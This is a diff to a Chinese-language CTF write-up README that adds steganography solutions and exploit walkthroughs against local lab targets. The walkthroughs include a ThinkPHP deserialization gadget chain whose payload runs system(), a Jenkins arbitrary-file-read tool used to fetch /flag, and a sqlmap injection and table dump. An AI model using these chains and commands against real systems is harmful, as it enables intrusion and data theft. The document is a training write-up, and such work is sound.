@@ -28,7 +28,7 @@
 ### HTTP-001
 > F12 -> /flag/index.php
 ### HTTP-002
-> User-Agent: knownsec
+> User-Agent: wjlin0
 ### HTTP-003
 > Cookie: username=admin;
 ### HTTP-004
@@ -45,7 +45,7 @@ curl https://ip:port/api/flag.php -H "Content-Type: application/json" -d '{"flag
 ### HTTP-008
 > X-Forwarded-For: 127.0.0.1
 ### HTTP-009
-> `Cookie: username=admin` -> `POST` -> `User-Agent: knownsec` -> `REFERER: flag.com` -> `X-Forwarded-For: 127.0.0.1`
+> `Cookie: username=admin` -> `POST` -> `User-Agent: wjlin0` -> `REFERER: flag.com` -> `X-Forwarded-For: 127.0.0.1`
 ### HTTP-010
 > response header `HINT: hint.php` -> `hint.php` -> `http://ip:port/index.php?url=http://127.0.0.1/hint.php`
 ### HTTP-011
@@ -132,7 +132,7 @@ print(resp.text)
 ### PHP基础-021
 > 在5.x 版本中 preg_replace`/e`模式,结果会带入eval函数中执行 ?username=var_dump($flag)
 ### PHP基础-022
-> 变量覆盖 `?password[username]=knownsec`
+> 变量覆盖 `?password[username]=wjlin0`
 ### PHP基础-023
 > 变量覆盖 `?suces=flag&flag=`
 ### PHP基础-024
@@ -805,3 +805,445 @@ data.xml
 </class>
 
 ```
+
+## MISC
+
+### 图片隐写-001
+
+> 拼接
+
+winhex (010 editor) 打开 
+
+![img.png](./img/README/img.png)
+
+### 图片隐写-002
+
+> Exif信息
+
+winhex (010 editor) 打开 
+
+![img.png](./img/README/img-2627657.png)
+
+也可使用[ExifTool](https://www.rmnof.com/article/exiftool-introduction/)查看
+
+![img.png](./img/README/img2.png)
+
+### 图片隐写-003
+
+> lsb隐写
+
+使用工具[Stegsolve.jar](http://www.caesum.com/handbook/Stegsolve.jar) 解密
+
+![img.png](./img/README/img-2627681.png)
+
+也可使用python脚本
+
+```python3
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from PIL import Image
+
+
+def decode_lsb(image_path):
+    """Decode message from image using LSB."""
+    img = Image.open(image_path)
+    width, height = img.size
+    binary_message = ''
+
+    for y in range(height):
+        for x in range(width):
+            pixel = img.getpixel((x, y))
+            for value in pixel:
+                binary_message += str(value & 1)
+
+    # Find the end of message marker
+    end_index = binary_message.find('1111111111111110')
+    message = binary_to_string(binary_message[:end_index])
+
+    return message
+
+
+def binary_to_string(binary_str):
+    """Convert binary string to text."""
+    return ''.join(chr(int(binary_str[i:i + 8], 2)) for i in range(0, len(binary_str), 8))
+
+
+# Example usage
+image_path = "123.png"
+
+
+# Decode message from image
+decoded_message = decode_lsb("ctf.png")
+print("Decoded message:", decoded_message)
+
+```
+
+### 图片隐写-004
+
+> 修复文件头
+
+修复png图片的文件头
+![img.png](./img/README/img-2627715.png)
+
+打开图片，即可得到flag
+![img_1.png](./img/README/img_1.png)
+
+### 图片隐写-005
+
+> 高度被修改，依据正确的CRC爆破出正确的长度
+
+![img.png](./img/README/img-2627780.png)
+
+```shell
+python3 main.py ctf.png
+```
+
+```python
+#!/usr/bin/env python3
+import binascii
+import os
+import random
+import string
+import struct
+import sys
+import zlib
+
+
+def randStr(length=16):
+    # 生成随机字节序列
+    visible_chars = string.digits + string.ascii_lowercase
+    random_string = ''.join(random.choice(visible_chars) for _ in range(length))
+    return random_string
+
+
+def main():
+    filename = sys.argv[1]
+    with open(filename, 'rb') as f:
+        data = f.read()
+    if bytes.fromhex('89504E47') != data[:4]:
+        print("Invalid PNG file")
+        return
+    high = int.from_bytes(data[16:20], byteorder='big')
+    width = int.from_bytes(data[20:24], byteorder='big')
+    crc_png = data[29:33]
+    print(f"当前图片中的CRC、high、width: {crc_png.hex()} {high} {width} ")
+    crc_old = zlib.crc32(data[12:29]) & 0xffffffff
+    if crc_old == int.from_bytes(crc_png, "big"):
+        print("CRC校验正确")
+        return
+
+    crc_input = input(f"CRC校验错误，请输入正确的CRC值，或者输入yes使用默认值(default {crc_png.hex()})")
+    if crc_input == "" or crc_input.startswith("ye"):
+        crc_input = crc_png
+    else:
+        crc_input = crc_input.encode()
+    flag = False
+    for i in range(9999):
+        if flag: break
+        for j in range(9999):
+            data2 = data[12:16] + struct.pack('>i', i) + struct.pack('>i', j) + data[24:29]
+            crc = zlib.crc32(data2) & 0xffffffff
+            if crc == int.from_bytes(crc_input, "big"):
+                print(f"找到正确的CRC值: {crc}")
+                data3 = data[:16] + struct.pack('>i', i) + struct.pack('>i', j) + data[24:29] + crc.to_bytes(4,
+                                                                                                             'big') + data[
+                                                                                                                      33:]
+                filename = randStr(10) + ".png"
+                print(f"生成的文件: {filename}")
+                with open(filename, 'wb') as f:
+                    f.write(data3)
+                flag = True
+                break
+
+
+if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print("Usage: %s <filename>" % sys.argv[0])
+        sys.exit(1)
+    main()
+
+```
+
+### 图片隐写-006
+
+> 二维码取反色
+> 可以看到三个白色酷似二维码的定位符，于是去反色。
+
+```shell
+python3 main.py
+```
+
+```python
+from PIL import Image
+
+def invert_colors(image_path, output_path):
+    # 打开图像
+    image = Image.open(image_path)
+
+    # 取得图像的尺寸
+    width, height = image.size
+
+    # 创建一个新的空白图像，用于存储反转颜色后的图像
+    inverted_image = Image.new('RGBA', (width, height))
+
+    # 遍历图像的每一个像素，并反转其颜色
+    for x in range(width):
+        for y in range(height):
+            # 获取当前像素的RGBA值
+            r, g, b, a = image.getpixel((x, y))
+            # 反转颜色
+            inverted_color = (255 - r, 255 - g, 255 - b, a)
+            # 将反转后的颜色应用到新图像的对应位置
+            inverted_image.putpixel((x, y), inverted_color)
+
+    # 保存反转颜色后的图像
+    inverted_image.save(output_path)
+
+# 使用示例
+image_path = 'ctf.png'  # 输入图像路径
+output_path = 'ctf_inverted_image.png'  # 输出图像路径
+invert_colors(image_path, output_path)
+
+```
+
+或者部分手机的照片自动识别取反后的二维码如
+
+![img.png](./img/README/img-2627809.png)
+
+### 图片隐写-007
+
+>  使用以下命令后会自动生成 output文件夹，其中就有分离出的文件。
+
+```shell
+foremost ctf.png
+```
+
+
+
+![img.png](./img/README/img-2627829.png)
+
+
+
+### 文档隐写-001
+
+> 白底字
+> 改成黑色后即可看到
+
+![img.png](./img/README/img-3159019.png)
+
+
+
+
+
+### 文档隐写-002
+
+> snow加密
+
+使用工具`snow`工具，可将flag提取出来。
+
+![img.png](./img/README/img-3159036.png)
+
+
+
+
+
+### 音频隐写-001
+
+> 音频隐写 摩丝密码
+
+打开ctf.mp3 后发现酷似摩丝密码，于是使用`audacity` 依据音频写出摩丝密码
+
+![img.png](./img/README/img-3159052.png)
+
+
+```text
+..-./.-../.-/--./----.--/-----/---../...../...--/..-./..---/.-/.----/---../.----/-.-./..---/-----/.----/--.../.-/..-./--.../-----/..---/-----/-.-./----./.-/.-/---../-.../...--/./...../-.../---../-----.-
+```
+
+解码后
+
+```text
+FLAG%u7b0853F2A181C2017AF7020C9AA8B3E5B8%u7d
+```
+
+%u7b、%u7d 是 `{`,`}`
+
+### ZIP隐写-001
+
+> 伪加密
+
+修改 通用位标记 `(General purpose bit flag)`  为 00后打开，macos/linux 可直接打开无需密码 
+
+![img.png](./img/README/img-3159122.png)
+
+### ZIP隐写-002
+
+> 暴力破解
+
+
+```shell
+fcrackzip -b -l 5 -ca  -u ctf.zip
+```
+
+![img.png](./img/README/img-3160332.png)
+
+
+
+
+
+
+
+## CVE
+
+### CVE-2022-38352
+> CVE-2022-38352
+
+目录扫描发现 `www.zip`，下载后发现存在`unserialize`，利用 `CVE-2022-38352` 反序列化链构造POC
+
+```php
+<?php
+namespace think\view\driver;
+class Php
+{
+}
+
+namespace think;
+class App {
+    protected $instances = [];
+
+    public function __construct()
+    {
+        $this->instances = [
+            "think\Request"=>new Request(),
+        ];
+
+    }
+}
+class Request {
+    protected $url;
+
+    public function __construct()
+    {
+        $this->url = '<?php system(\'curl \');exit(); ?>';
+    }
+}
+
+
+namespace think\log\driver;
+use think\App;
+use think\view\driver\Php;
+
+class Socket {
+    protected $config;
+    protected $app;
+    protected $clientArg;
+    public function __construct()
+    {
+        $this->config = [
+            "force_client_ids" => true,
+            "allow_client_ids"=> [],
+            "debug" => true,
+            "format_head"=> [new Php(),"display"]
+        ];
+        $this->app = new App();
+        $this->clientArg = ["tabid"=>"1"];
+    }
+}
+
+
+namespace think\log;
+use think\log\driver\Socket;
+
+class Channel {
+    protected $logger;
+    protected $lazy = false;
+    public function __construct()
+    {
+        $this->lazy = false;
+        $this->logger = new Socket();
+    }
+}
+
+
+namespace League\Flysystem\Cached\Storage;
+
+
+use think\log\Channel;
+
+class Psr6Cache
+{
+    protected $autosave = false;
+    private $pool;
+    function __construct(){
+        $this->pool =new Channel();
+    }
+
+}
+
+
+echo base64_encode(serialize(new Psr6Cache()));
+```
+
+### CVE-2024-23897
+> CVE-2024-23897 jenkins 存在任意文件读取
+
+下载工具
+
+- [macOS-arm64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_macOS_arm64.zip)
+
+- [macOS-amd64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_macOS_amd64.zip)
+
+- [linux-amd64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_linux_amd64.zip)
+
+- [windows-amd64](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_windows_amd64.zip)
+
+- [windows-386](https://github.com/wjlin0/CVE-2024-23897/releases/download/v1.0.2/CVE-2024-23897_1.0.2_windows_386.zip)
+
+```shell
+CVE-2024-23897 -u http://localhost:9002/
+```
+
+![image-20240413122058087](./img/README/image-20240413122058087.png)
+
+读取`/flag` 文件
+
+```sh
+CVE-2024-23897 -u http://localhost:9002 -c connect-node -a /flag
+```
+
+
+
+![image-20240413122219414](./img/README/image-20240413122219414.png)
+
+### CVE-2024-25325
+
+> CVE-2024-25325 登陆处存在sql注入
+
+将以下请求保存至`flag.txt`
+
+```text
+POST /Admin/login.php HTTP/1.1
+Host: localhost:9001
+Content-Length: 47
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Connection: close
+
+txtusername=admin&txtpassword=1*&btnlogin=
+```
+
+利用`sqlmap`使用
+
+```sh
+sqlmap -r Desktop/flag.txt
+```
+
+![image-20240413123221732](./img/README/image-20240413123221732.png)
+
+```sh
+sqlmap -r Desktop/flag.txt --technique B -D employee_akpoly -T flag -C flag --dump
+```
+
+![image-20240413125347827](./img/README/image-20240413125347827.png)
